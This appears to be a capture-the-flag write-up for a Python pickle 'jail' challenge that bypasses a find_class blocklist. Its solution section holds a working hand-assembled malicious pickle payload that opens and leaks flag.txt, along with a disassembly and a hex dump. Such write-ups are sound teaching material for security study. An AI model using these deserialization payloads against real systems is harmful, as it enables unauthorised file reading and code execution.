# jail 3

## restrictions

larger blocklist for the `find_class` function

additionally, all find_class only finds functions/classes from builtins or from `__main__`

## hints

<details>
    <summary>Hint 1</summary>

We don't need to get a shell to get the flag because we know the flag is in `flag.txt`

</details>

<details>
    <summary>Hint 2</summary>

We need to open the file and read the data. Hmm... If only we could somehow get the read attribute of an object easily.

</details>

<details>
    <summary>Hint 3</summary>

Perhaps try using BUILD opcode on Data class with `{"Book": open('flag.txt'}`

</details>

<details>
    <summary>Hint 4</summary>

Well, print is blocked. I wonder what other functions in builtins will easily allow us to get the data...

</details>

<details>
    <summary>Hint 5</summary>

Perhaps `input(flag)`?

</details>

<details>
    <summary>Solution</summary>

tl;dr - `Data.Book = open("flag.txt"); input(Data.Book.read())`

solve.py
```
from pickle import *
from pickletools import dis

p = b""

p += PROTO
p += b'\x05'

p += GLOBAL
p += b'data\n'
p += b'self\n'

p += NONE

p += MARK

p += STRING
p += b'"Book"\n'

p += GLOBAL
p += b'builtins\n'
p += b'open\n'
p += STRING
p += b'"flag.txt"\n'
p += TUPLE1
p += REDUCE

p += DICT

p += TUPLE2
p += BUILD

p += POP

p += GLOBAL
p += b'data\n'
p += b'read\n'
p += EMPTY_TUPLE
p += REDUCE
p += MEMOIZE  # memo[0] = flag
p += POP

p += GLOBAL
p += b'builtins\n'
p += b'input\n'  # no access to print so we use input instead
p += GET
p += b'0\n'
p += TUPLE1
p += REDUCE

p += STOP

dis(p)
print("="*50)
print(p.hex())
```

output
```
    0: \x80 PROTO      5
    2: c    GLOBAL     'data self'
   13: N    NONE
   14: (    MARK
   15: S        STRING     'Book'
   23: c        GLOBAL     'builtins open'
   38: S        STRING     'flag.txt'
   50: \x85     TUPLE1
   51: R        REDUCE
   52: d        DICT       (MARK at 14)
   53: \x86 TUPLE2
   54: b    BUILD
   55: 0    POP
   56: c    GLOBAL     'data read'
   67: )    EMPTY_TUPLE
   68: R    REDUCE
   69: \x94 MEMOIZE    (as 0)
   70: 0    POP
   71: c    GLOBAL     'builtins input'
   87: g    GET        0
   90: \x85 TUPLE1
   91: R    REDUCE
   92: .    STOP
highest protocol among opcodes = 4
==================================================
800563646174610a73656c660a4e285322426f6f6b220a636275696c74696e730a6f70656e0a5322666c61672e747874220a85526486623063646174610a726561640a29529430636275696c74696e730a696e7075740a67300a85522e
```

</details>
